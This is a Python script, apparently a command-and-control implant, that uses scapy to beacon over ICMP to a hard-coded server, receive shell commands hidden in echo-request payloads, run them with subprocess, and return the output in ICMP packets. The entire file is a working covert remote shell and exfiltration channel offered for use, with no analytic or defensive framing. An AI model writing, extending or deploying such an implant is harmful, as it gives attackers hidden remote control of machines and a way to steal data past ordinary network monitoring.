from scapy.all import *
import time
import socket

SERVER_IP = "192.168.10.50"

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't need to reach the address; no packets are sent.
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

LOCAL_IP = get_local_ip()

def send_beacon():
    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/"BEACON|ThisIsABeacon".encode()
    send(pkt, verbose=0)

def handle_incoming(pkt):
    # Look for ICMP Echo Requests FROM the server
    print("Received packet")

    if IP in pkt and ICMP in pkt:
        if pkt[IP].src == SERVER_IP and pkt[ICMP].type == 8:
            if pkt.haslayer(Raw) and pkt[IP].dst == LOCAL_IP: # troubleshoot here if command exec stops working
                # need to handle CMD vs regular
                task = pkt[Raw].load.decode(errors="ignore")
                print(f"[+] Received task: {task}")
                run_task(task)

def run_task(cmd):
    # Execute and send back results
    import subprocess
    MAX_PAYLOAD = 1460
    PREFIX = b"RESULT|"

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        result_bytes = output
    except Exception as e:
        result_bytes = str(e).encode(errors="ignore")

    # Leave room for prefix
    max_result_bytes = MAX_PAYLOAD - len(PREFIX)

    # Truncate safely
    result_bytes = result_bytes[:max_result_bytes]

    payload = PREFIX + result_bytes

    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/payload
    send(pkt, verbose=0)

    print(f"[+] Sent results: {payload}")

if __name__ == "__main__":
    sniffer = AsyncSniffer(filter=f"icmp and src {SERVER_IP}", prn=handle_incoming, store=False)
    sniffer.start()

    while True:
        send_beacon()
        print("[+] Beacon sent")
        time.sleep(10)
